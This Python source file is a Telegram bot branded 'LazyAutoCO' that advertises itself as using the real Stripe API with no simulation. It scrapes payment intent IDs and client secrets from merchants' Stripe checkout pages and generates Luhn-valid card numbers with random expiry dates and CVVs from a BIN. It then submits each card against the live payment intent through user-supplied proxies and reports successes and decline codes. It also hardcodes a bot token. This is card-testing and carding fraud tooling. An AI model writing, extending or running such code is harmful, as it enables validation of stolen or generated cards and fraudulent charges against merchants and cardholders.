import asyncio
import aiohttp
import logging
import re
import json
import time
import random
import hmac
import hashlib
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
)
import nest_asyncio
nest_asyncio.apply()

# ============= CONFIGURATION =============
BOT_TOKEN = "8249305108:AAF8gvL3E-y-ybKJNL3r60HV1lEyg-e0Z9Q"
ADMIN_IDS = [8447673079]

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= CONVERSATION STATES =============
WAITING_EMAIL, WAITING_PROXY, WAITING_CARDS, WAITING_BIN = range(4)

# ============= DATA CLASSES =============
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str) -> Optional['Card']:
        card_str = card_str.strip()
        
        if '|' in card_str:
            parts = card_str.split('|')
        else:
            parts = card_str.split()
        
        if len(parts) >= 4:
            number = re.sub(r'\D', '', parts[0])
            month = re.sub(r'\D', '', parts[1]).zfill(2)
            year = re.sub(r'\D', '', parts[2]).zfill(2)
            cvv = re.sub(r'\D', '', parts[3])
            
            if len(number) >= 13 and len(number) <= 19:
                if 1 <= int(month) <= 12:
                    if len(year) in [2, 4]:
                        if len(cvv) in [3, 4]:
                            return cls(
                                number=number,
                                month=month,
                                year=year[-2:] if len(year) == 4 else year,
                                cvv=cvv
                            )
        return None
    
    @classmethod
    def generate_from_bin(cls, bin_str: str, count: int = 1) -> List['Card']:
        bin_clean = re.sub(r'\D', '', bin_str)[:6]
        if len(bin_clean) < 6:
            return []
        
        cards = []
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        def luhn_checksum(card_number: str) -> int:
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def is_amex(bin_prefix: str) -> bool:
            return bin_prefix[:2] in ['34', '37']
        
        for _ in range(min(count, 10)):
            remaining = ''.join(str(random.randint(0, 9)) for _ in range(9))
            number_without_check = bin_clean + remaining
            check = luhn_checksum(number_without_check)
            number = number_without_check + str((10 - check) % 10)
            
            year_offset = random.randint(1, 4)
            year = (current_year + year_offset) % 100
            month = random.randint(1, 12)
            
            if year_offset == 0 and month < current_month:
                month = random.randint(current_month, 12)
            
            cvv_length = 4 if is_amex(bin_clean) else 3
            cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
            
            cards.append(cls(
                number=number,
                month=str(month).zfill(2),
                year=str(year).zfill(2),
                cvv=cvv
            ))
        
        return cards
    
    @property
    def full(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"

@dataclass
class Proxy:
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    
    @classmethod
    def from_string(cls, proxy_str: str) -> Optional['Proxy']:
        proxy_str = proxy_str.strip()
        
        # Format: host:port:user:pass
        if proxy_str.count(':') >= 3:
            parts = proxy_str.split(':')
            if len(parts) >= 4:
                if '.' in parts[0] or parts[0].replace('.', '').isdigit():
                    return cls(
                        host=parts[0],
                        port=int(parts[1]),
                        username=parts[2],
                        password=':'.join(parts[3:])
                    )
                else:
                    return cls(
                        host=parts[-2],
                        port=int(parts[-1]),
                        username=parts[0],
                        password=':'.join(parts[1:-2])
                    )
        
        # Format: user:pass@host:port
        elif '@' in proxy_str:
            auth_part, host_part = proxy_str.rsplit('@', 1)
            if ':' in auth_part and ':' in host_part:
                username, password = auth_part.split(':', 1)
                host, port = host_part.split(':', 1)
                return cls(
                    host=host,
                    port=int(port),
                    username=username,
                    password=password
                )
        
        # Format: host:port
        elif proxy_str.count(':') == 1:
            host, port = proxy_str.split(':')
            return cls(host=host, port=int(port))
        
        return None
    
    @property
    def url(self) -> str:
        if self.username and self.password:
            return f"http://{self.username}:{self.password}@{self.host}:{self.port}"
        return f"http://{self.host}:{self.port}"

# ============= REAL STRIPE API INTEGRATION =============
class StripeAPI:
    def __init__(self):
        self.session = None
        self.base_url = "https://api.stripe.com"
    
    async def get_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    async def extract_payment_intent(self, url: str) -> Optional[Dict]:
        """Extract payment intent from checkout URL"""
        session = await self.get_session()
        
        try:
            # First get the checkout page
            async with session.get(url, allow_redirects=True, timeout=10) as resp:
                html = await resp.text()
                
                # Look for payment intent ID
                pi_match = re.search(r'pi_[a-zA-Z0-9]{24}', html)
                if not pi_match:
                    return None
                
                payment_intent_id = pi_match.group(0)
                
                # Look for client secret
                secret_match = re.search(rf'{payment_intent_id}_secret_[a-zA-Z0-9]+', html)
                client_secret = secret_match.group(0) if secret_match else None
                
                # Look for publishable key
                pk_match = re.search(r'pk_(?:live|test)_[a-zA-Z0-9]+', html)
                publishable_key = pk_match.group(0) if pk_match else None
                
                # Extract merchant info
                merchant_match = re.search(r'"business_name":\s*"([^"]+)"', html) or \
                                re.search(r'"display_name":\s*"([^"]+)"', html) or \
                                re.search(r'<title>([^<]+)</title>', html)
                
                amount_match = re.search(r'"amount":\s*(\d+)', html)
                currency_match = re.search(r'"currency":\s*"([a-z]{3})"', html)
                
                return {
                    'payment_intent_id': payment_intent_id,
                    'client_secret': client_secret,
                    'publishable_key': publishable_key,
                    'merchant': merchant_match.group(1).strip() if merchant_match else 'Unknown',
                    'amount': int(amount_match.group(1)) if amount_match else None,
                    'currency': currency_match.group(1) if currency_match else 'usd'
                }
                
        except Exception as e:
            logger.error(f"Error extracting payment intent: {e}")
            return None
    
    async def create_payment_method(self, card: Card, proxy: Optional[Proxy] = None) -> Optional[str]:
        """Create a payment method with Stripe API"""
        session = await self.get_session()
        
        url = f"{self.base_url}/v1/payment_methods"
        
        data = {
            'type': 'card',
            'card[number]': card.number,
            'card[exp_month]': card.month,
            'card[exp_year]': card.year,
            'card[cvc]': card.cvv
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        try:
            connector = None
            if proxy:
                connector = aiohttp.TCPConnector()
            
            async with session.post(url, data=data, headers=headers, proxy=proxy.url if proxy else None, connector=connector) as resp:
                result = await resp.json()
                
                if resp.status in [200, 201] and 'id' in result:
                    return result['id']
                else:
                    logger.error(f"PM creation failed: {result}")
                    return None
                    
        except Exception as e:
            logger.error(f"PM creation error: {e}")
            return None
    
    async def attach_payment_method(self, payment_intent_id: str, payment_method_id: str, client_secret: str) -> Tuple[bool, str]:
        """Attach payment method to payment intent"""
        session = await self.get_session()
        
        url = f"{self.base_url}/v1/payment_intents/{payment_intent_id}/confirm"
        
        data = {
            'payment_method': payment_method_id,
            'client_secret': client_secret
        }
        
        try:
            async with session.post(url, data=data) as resp:
                result = await resp.json()
                
                if resp.status in [200, 201]:
                    if result.get('status') == 'succeeded':
                        return True, 'success'
                    elif result.get('status') == 'requires_action':
                        return False, 'requires_3ds'
                    elif result.get('status') == 'requires_payment_method':
                        return False, 'requires_new_card'
                    else:
                        return False, f"status: {result.get('status')}"
                
                # Check for decline codes
                error = result.get('error', {})
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'unknown_error')
                
                if decline_code:
                    return False, decline_code
                else:
                    return False, message
                    
        except Exception as e:
            logger.error(f"Confirm error: {e}")
            return False, 'request_error'
    
    async def get_payment_intent_status(self, payment_intent_id: str) -> Optional[Dict]:
        """Get payment intent status"""
        session = await self.get_session()
        
        url = f"{self.base_url}/v1/payment_intents/{payment_intent_id}"
        
        try:
            async with session.get(url) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
        except:
            return None

# ============= BOT CLASS =============
class CheckoutBot:
    def __init__(self, token: str):
        self.token = token
        self.app = Application.builder().token(token).build()
        
        self.stripe = StripeAPI()
        self.user_proxies: Dict[int, Proxy] = {}
        self.user_email: Dict[int, str] = {}
        
        self.setup_handlers()
    
    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("setemail", self.setemail_command))
        self.app.add_handler(CommandHandler("proxy", self.proxy_command))
        self.app.add_handler(CommandHandler("clearproxy", self.clearproxy_command))
        self.app.add_handler(CommandHandler("co", self.checkout_command))
        self.app.add_handler(CommandHandler("cb", self.checkout_bin_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, 
            self.handle_text
        ))
        
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
        self.app.add_error_handler(self.error_handler)
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        logger.error(f"Error: {context.error}")
        try:
            await update.message.reply_text(f"❌ Error: {str(context.error)[:100]}")
        except:
            pass
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        welcome = """
╔════════════════════════════╗
║     🤖 *LazyAutoCO*        ║
╚════════════════════════════╝

*REAL STRIPE API - NO SIMULATION*

*Setup:*
• `/setemail your@email.com` - Set your email
• `/proxy host:port:user:pass` - Add proxy
• `/clearproxy` - Remove proxy

*Commands:*
• `/co <checkout_url>` - Test cards
• `/cb <url> <bin> [count]` - Generate BIN cards

*Examples:*
`/co https://buy.stripe.com/test_xxx`
`/cb https://buy.stripe.com/test_xxx 424242 5`

*Proxy Formats:*
• `host:port`
• `host:port:user:pass`
• `user:pass@host:port`
"""
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = """
*Commands:*
• `/setemail email` - Set your email
• `/proxy proxy_string` - Add proxy
• `/clearproxy` - Remove proxy
• `/co url` - Test cards
• `/cb url bin [count]` - Generate BIN cards
• `/status` - Check setup
• `/cancel` - Cancel

*Card Format:*
`4111111111111111|12|25|123`

*BIN Generation:*
Generates valid Luhn cards with random expiry

*Real Stripe Responses:*
• `success` - Payment successful
• `insufficient_funds` - Card has insufficient funds
• `card_declined` - Generic decline
• `incorrect_cvc` - Wrong security code
• `expired_card` - Card expired
• `processing_error` - Processing error
• `do_not_honor` - Bank declined
"""
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def setemail_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.args:
            email = context.args[0]
            if '@' in email and '.' in email:
                user_id = update.effective_user.id
                self.user_email[user_id] = email
                await update.message.reply_text(f"✅ Email set: {email}")
            else:
                await update.message.reply_text("❌ Invalid email")
        else:
            await update.message.reply_text("Usage: `/setemail your@email.com`", parse_mode='Markdown')
    
    async def proxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if context.args:
            proxy_str = ' '.join(context.args)
            proxy = Proxy.from_string(proxy_str)
            
            if proxy:
                user_id = update.effective_user.id
                self.user_proxies[user_id] = proxy
                await update.message.reply_text(f"✅ Proxy set: {proxy.host}:{proxy.port}")
            else:
                await update.message.reply_text("❌ Invalid proxy format")
        else:
            await update.message.reply_text(
                "Usage: `/proxy host:port:user:pass`\n"
                "Example: `/proxy 192.168.1.1:8080:user:pass`",
                parse_mode='Markdown'
            )
    
    async def clearproxy_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id in self.user_proxies:
            del self.user_proxies[user_id]
        await update.message.reply_text("🗑️ Proxy cleared")
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        email = self.user_email.get(user_id, 'Not set')
        proxy = self.user_proxies.get(user_id)
        
        status = f"""
*Your Setup*

*Email:* `{email}`
*Proxy:* {f'`{proxy.host}:{proxy.port}`' if proxy else 'None'}
"""
        await update.message.reply_text(status, parse_mode='Markdown')
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data.clear()
        await update.message.reply_text("❌ Cancelled")
    
    async def checkout_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id not in self.user_email:
            await update.message.reply_text("❌ Please set email first with /setemail")
            return
        
        if not context.args:
            await update.message.reply_text("Usage: `/co <checkout_url>`", parse_mode='Markdown')
            return
        
        url = context.args[0]
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        context.user_data['url'] = url
        context.user_data['state'] = WAITING_CARDS
        
        # Extract payment intent
        status_msg = await update.message.reply_text("🔄 Extracting payment info...")
        payment_info = await self.stripe.extract_payment_intent(url)
        
        if payment_info:
            amount = f"{payment_info['amount']/100:.2f} {payment_info['currency'].upper()}" if payment_info['amount'] else 'Unknown'
            
            context.user_data['payment_info'] = payment_info
            
            text = f"""
✅ *Checkout Detected*

*Merchant:* {payment_info['merchant']}
*Amount:* {amount}
*Payment Intent:* `{payment_info['payment_intent_id']}`

Send cards (one per line, max 10):
`4111111111111111|12|25|123`
"""
            await status_msg.edit_text(text, parse_mode='Markdown')
        else:
            await status_msg.edit_text(
                "⚠️ Could not extract payment info\n\nSend cards anyway? (one per line)",
                parse_mode='Markdown'
            )
    
    async def checkout_bin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        if user_id not in self.user_email:
            await update.message.reply_text("❌ Please set email first with /setemail")
            return
        
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: `/cb <url> <bin> [count]`\n"
                "Example: `/cb https://buy.stripe.com/xxx 424242 5`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        bin_str = context.args[1]
        count = 1
        
        if len(context.args) >= 3:
            try:
                count = min(int(context.args[2]), 10)
            except:
                count = 1
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        bin_clean = re.sub(r'\D', '', bin_str)
        if len(bin_clean) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits")
            return
        
        status_msg = await update.message.reply_text("🔄 Processing...")
        
        # Extract payment info
        payment_info = await self.stripe.extract_payment_intent(url)
        
        if not payment_info or not payment_info.get('payment_intent_id'):
            await status_msg.edit_text("❌ Could not extract payment intent from URL")
            return
        
        # Generate cards
        cards = Card.generate_from_bin(bin_clean, count)
        
        # Process cards
        results = []
        proxy = self.user_proxies.get(user_id)
        
        for i, card in enumerate(cards):
            await status_msg.edit_text(f"🔄 Processing card {i+1}/{len(cards)}...")
            
            # Create payment method
            pm_id = await self.stripe.create_payment_method(card, proxy)
            
            if not pm_id:
                results.append((card, 'error', 'payment_method_failed'))
                continue
            
            # Attach to payment intent
            success, message = await self.stripe.attach_payment_method(
                payment_info['payment_intent_id'],
                pm_id,
                payment_info.get('client_secret', '')
            )
            
            if success:
                results.append((card, 'success', message))
            else:
                results.append((card, 'decline', message))
            
            await asyncio.sleep(1)  # Rate limiting
        
        # Format results
        await self.send_results(update, payment_info, results, len(cards))
        await status_msg.delete()
    
    async def process_cards(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process cards from /co command"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        cards = context.user_data.get('cards', [])
        url = context.user_data.get('url', '')
        payment_info = context.user_data.get('payment_info', {})
        
        if not payment_info:
            # Try to extract again
            payment_info = await self.stripe.extract_payment_intent(url)
        
        if not payment_info or not payment_info.get('payment_intent_id'):
            await query.edit_message_text("❌ Could not extract payment intent")
            return
        
        await query.edit_message_text(f"🔄 Processing {len(cards)} cards...")
        
        # Process cards
        results = []
        proxy = self.user_proxies.get(user_id)
        
        for i, card in enumerate(cards):
            # Create payment method
            pm_id = await self.stripe.create_payment_method(card, proxy)
            
            if not pm_id:
                results.append((card, 'error', 'payment_method_failed'))
                continue
            
            # Attach to payment intent
            success, message = await self.stripe.attach_payment_method(
                payment_info['payment_intent_id'],
                pm_id,
                payment_info.get('client_secret', '')
            )
            
            if success:
                results.append((card, 'success', message))
            else:
                results.append((card, 'decline', message))
            
            await asyncio.sleep(1)  # Rate limiting
        
        await self.send_results(update, payment_info, results, len(cards))
        context.user_data.clear()
    
    async def send_results(self, update: Update, payment_info: Dict, results: List[Tuple], generated: int):
        """Send formatted results"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username = update.effective_user.username or "user"
        
        amount = f"{payment_info['amount']/100:.2f} {payment_info['currency'].upper()}" if payment_info.get('amount') else 'Unknown'
        
        text = [
            "╔════════════════════════════╗",
            "║     🤖 *LazyAutoCO*        ║",
            "╚════════════════════════════╝",
            "",
            f"*Merchant:* {payment_info.get('merchant', 'Unknown')}",
            f"*Amount:* {amount}",
            f"*Cards:* {len(results)}" + (" (Generated from BIN)" if generated > 0 else ""),
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        
        success_count = 0
        for i, (card, status, msg) in enumerate(results, 1):
            icon = "✅" if status == "success" else "❌" if status == "decline" else "⚠️"
            text.append("")
            text.append(f"*Card #{i}:*")
            text.append(f"`{card.full}`")
            text.append(f"*Message:* `{msg}`")
            
            if status == "success":
                success_count += 1
            
            if i < len(results):
                text.append("")
        
        text.extend([
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"*All cards processed*",
            f"*Success:* {success_count}/{len(results)}",
            f"*Time:* {timestamp}",
            "",
            f"*Req By:* @{username}"
        ])
        
        # Send result
        result_text = "\n".join(text)
        
        if hasattr(update, 'callback_query') and update.callback_query:
            await update.callback_query.message.reply_text(result_text, parse_mode='Markdown')
        else:
            await update.message.reply_text(result_text, parse_mode='Markdown')
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        
        state = context.user_data.get('state')
        
        if state == WAITING_CARDS:
            url = context.user_data.get('url')
            if not url:
                await update.message.reply_text("❌ Session expired. Use /co again")
                return
            
            lines = text.strip().split('\n')
            cards = []
            
            for line in lines[:10]:
                card = Card.from_string(line)
                if card:
                    cards.append(card)
            
            if not cards:
                await update.message.reply_text("❌ No valid cards found")
                return
            
            keyboard = [[
                InlineKeyboardButton("✅ Process", callback_data="process"),
                InlineKeyboardButton("❌ Cancel", callback_data="cancel")
            ]]
            
            context.user_data['cards'] = cards
            
            await update.message.reply_text(
                f"*Process {len(cards)} cards?*",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        
        if query.data == "cancel":
            await query.answer()
            context.user_data.clear()
            await query.edit_message_text("❌ Cancelled")
        
        elif query.data == "process":
            await query.answer()
            await self.process_cards(update, context)
    
    async def run(self):
        """Run the bot"""
        print("🚀 Starting REAL Stripe Bot...")
        print(f"🤖 Bot: @{BOT_TOKEN[:10]}...")
        print("✅ Ready to process REAL payments")
        print("Press Ctrl+C to stop")
        
        await self.app.initialize()
        await self.app.start()
        await self.app.updater.start_polling(drop_pending_updates=True)
        
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            await self.shutdown()
    
    async def shutdown(self):
        """Clean shutdown"""
        await self.stripe.close()
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()
        print("👋 Bot stopped")

# ============= MAIN =============
async def main():
    bot = CheckoutBot(BOT_TOKEN)
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())